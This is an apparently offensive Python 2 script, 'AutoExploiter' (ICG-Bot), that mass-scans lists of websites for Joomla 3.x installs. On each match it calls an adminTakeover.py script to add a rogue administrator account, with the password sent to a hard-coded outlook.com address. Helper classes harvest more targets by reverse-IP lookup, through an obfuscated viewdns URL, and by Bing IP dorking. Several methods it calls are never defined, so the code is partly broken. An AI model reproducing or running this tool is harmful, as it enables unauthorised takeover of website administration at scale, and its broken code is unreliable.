#!/usr/bin/python27
import os, re, sys, socket, binascii, time, json, random, threading
from Queue import Queue

try:
    import requests
except ImportError:
    print '---------------------------------------------------'
    print '[*] pip install requests'
    print '   [-] you need to install requests Module'
    sys.exit()


class AutoExploiter(object):
    def __init__(self):
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        self.year = time.strftime("%y")
        self.month = time.strftime("%m")
        self.EMail = 'historyofsenja@outlook.com' # --> add your email for Add admin, Password Will send to this EMail @outlook.com best!

        try:
            self.select = sys.argv[1]
        except:
            self.cls()
            self.print_logo()
            self.Print_options()
            sys.exit()
        if self.select == str('1'):  # Single
            self.cls()
            self.print_logo()
            self.Url = raw_input(self.r + '    [+]' + self.c + 'Enter Target: ' + self.y)
            if self.Url.startswith("http://"):
                self.Url = self.Url.replace("http://", "")
            elif self.Url.startswith("https://"):
                self.Url = self.Url.replace("https://", "")
            else:
                pass
            try:
                CheckCMS = requests.get('http://' + self.Url + '/templates/system/css/system.css', timeout=5)
                if 'Import project-level system CSS' in CheckCMS.text.encode('utf-8') or CheckCMS.status_code == 200:
                    self.Print_Scanning(self.Url, 'joomla')
                    self.Joomla_TakeADmin(self.Url)
            except:
                self.Timeout(self.Url)
                sys.exit()


        elif self.select == str('2'):  # multi List
            self.cls()
            try:
                self.print_logo()
                Get_list = raw_input(self.r + '    [+]' + self.c + ' Enter List Websites: ' + self.y)
                with open(Get_list, 'r') as zz:
                    Readlist = zz.read().splitlines()
            except IOError:
                print self.r + '--------------------------------------------'
                print self.r + '    [' + self.y + '-' + self.r + '] ' + self.c + ' List Not Found in Directory!'
                sys.exit()
            thread = []
            for xx in Readlist:
                t = threading.Thread(target=self.Work2, args=(xx, ''))
                t.start()
                thread.append(t)
                time.sleep(0.1)
            for j in thread:
                j.join()
        elif self.select == str('3'):
            self.cls()
            self.print_logo()
            self.concurrent = 75
            try:
                self.Get_list = raw_input(self.r + '    [+]' + self.c + ' Enter List Websites: ' + self.y)
            except IOError:
                print self.r + '--------------------------------------------'
                print self.r + '    [' + self.y + '-' + self.r + '] ' + self.c + ' List Not Found in Directory!'
                sys.exit()
            self.q = Queue(self.concurrent * 2)
            for i in range(self.concurrent):
                self.t = threading.Thread(target=self.doWork)
                self.t.daemon = True
                self.t.start()
            try:
                for url in open(self.Get_list):
                    self.q.put(url.strip())
                self.q.join()
            except:
                pass

        else:
            self.cls()
            self.print_logo()
            print self.r + '--------------------------------------------'
            print self.r + '    [' + self.y + '*' + self.r + '] ' + self.c + ' Option Not Found! Try Again...'

    def Work2(self, url, s):
        try:
            if url.startswith("http://"):
                url = url.replace("http://", "")
            elif url.startswith("https://"):
                url = url.replace("https://", "")
            else:
                pass
            CheckCMS = requests.get('http://' + url + '/templates/system/css/system.css', timeout=5)
            if 'Import project-level system CSS' in CheckCMS.text.encode('utf-8') or CheckCMS.status_code == 200:
                self.Joomla_TakeADmin(url)
                self.FckEditor(url)
                self.q.task_done()
        except:
            pass
    def doWork(self):
        try:
            while True:
                url = self.q.get()
                if url.startswith('http://'):
                    url = url.replace('http://', '')
                elif url.startswith("https://"):
                    url = url.replace('https://', '')
                else:
                    pass
                try:
                    CheckCMS = requests.get('http://' + url + '/templates/system/css/system.css', timeout=5)
                    if 'Import project-level system CSS' in CheckCMS.text.encode('utf-8') or CheckCMS.status_code == 200:
                        self.Joomla_TakeADmin(url)
                        self.q.task_done()
                except:
                    pass
        except:
            pass



    def print_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """



                _                       _         ____  ICG-Bot
               | |      Add Admin      | |       |___ \ Version
               | | ___   ___  _ __ ___ | | __ _    __) |__  __
           _   | |/ _ \ / _ \| '_ ` _ \| |/ _` |  |__ < \ \/ /
          | |__| | (_) | (_) | | | | | | | (_| |  ___) | >  <
           \____/ \___/ \___/|_| |_| |_|_|\__,_| |____(_)_/\_\

    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)
    def Print_options(self):
        print self.r + '    [' + self.y + '1' + self.r + '] ' + self.c + 'Single Target' + self.w +\
              '     [ ' + 'python file.py 1' + ' ]'
        print self.r + '    [' + self.y + '2' + self.r + '] ' + self.c + 'List Scan' + self.w + '         [ ' + 'python file.py 2' + ' ]'
        print self.r + '    [' + self.y + '3' + self.r + '] ' + self.c + 'Thread List Scan' + self.w + '  [ ' + 'python file.py 3' + ' ]'


    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def Joomla_TakeADmin(self, site):
        try:
            GetVersion = requests.get('http://' + site + '/language/en-GB/en-GB.xml', timeout=5)
            if 'version="3.' in GetVersion.text.encode('utf-8'):
                os.system('python adminTakeover.py -u Jancok -p Jancok -e ' +
                          self.EMail + ' http://' + site)
        except:
            self.Print_NotVuln('Maybe Add Admin 3.x', site)

class reverse_ipz(object):
    def __init__(self):
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                   'Accept': '*/*'}
    def Reverse_ip(self, domain_Or_ipAddress):

        Check = domain_Or_ipAddress
        if Check.startswith("http://"):
            Check = Check.replace("http://", "")
        elif Check.startswith("https://"):
            Check = Check.replace("https://", "")
        else:
            pass
        try:
            self.ip = socket.gethostbyname(Check)
        except:
            sys.exit()
        Rev = requests.get(binascii.a2b_base64('aHR0cDovL3ZpZXdkbnMuaW5mby9yZXZlcnNlaXAvP2hvc3Q9') + self.ip + '&t=1',
                           headers=self.headers, timeout=5)
        Revlist = re.findall('<tr> <td>((([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}))</td>', Rev.text)
        if len(Revlist) == 1000:
            for url in Revlist:
                with open('logs/' + self.ip + 'x.txt', 'a') as xx:
                    xx.write(str(url[0]) + '\n')
            gotoBing = BingDorker()
            gotoBing.ip_bing(self.ip)
        else:
            for url in Revlist:
                with open('logs/' + self.ip + '.txt', 'a') as xx:
                    xx.write(str(url[0]) + '\n')


class BingDorker(object):
    def ip_bing(self, __ip):
        try:
            if __ip.startswith("http://"):
                __ip = __ip.replace("http://", "")
            elif __ip.startswith("https://"):
                __ip = __ip.replace("https://", "")
            else:
                pass
            try:
                ip = socket.gethostbyname(__ip)
            except:
                sys.exit()
            next = 0
            while next <= 500:
                url = "http://www.bing.com/search?q=ip%3A" + ip + "&first=" + str(next) + "&FORM=PORE"
                sess = requests.session()
                cnn = sess.get(url, timeout=5)
                next = next + 10
                finder = re.findall(
                    '<h2><a href="((?:https://|http://)[a-zA-Z0-9-_]+\.*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11})',
                    cnn.text)
                for url in finder:
                    if url.startswith('http://'):
                        url = url.replace('http://', '')
                    elif url.startswith('https://'):
                        url = url.replace('https://', '')
                    else:
                        pass
                    with open("logs/" + ip + "x.txt", 'a') as f:
                        if 'go.microsoft.com' in url:
                            pass
                        else:
                            f.write(str(url + '\n'))
            lines = open("logs/" + ip + "x.txt", 'r').read().splitlines()
            lines_set = set(lines)
            count = 0
            for line in lines_set:
                with open("logs/" + ip + ".txt", 'a') as xx:
                    count = count + 1
                    xx.write(line + '\n')
            os.unlink("logs/" + ip + "x.txt")
        except IOError:
            sys.exit()
        except IndexError:
            sys.exit()


Rock = AutoExploiter()
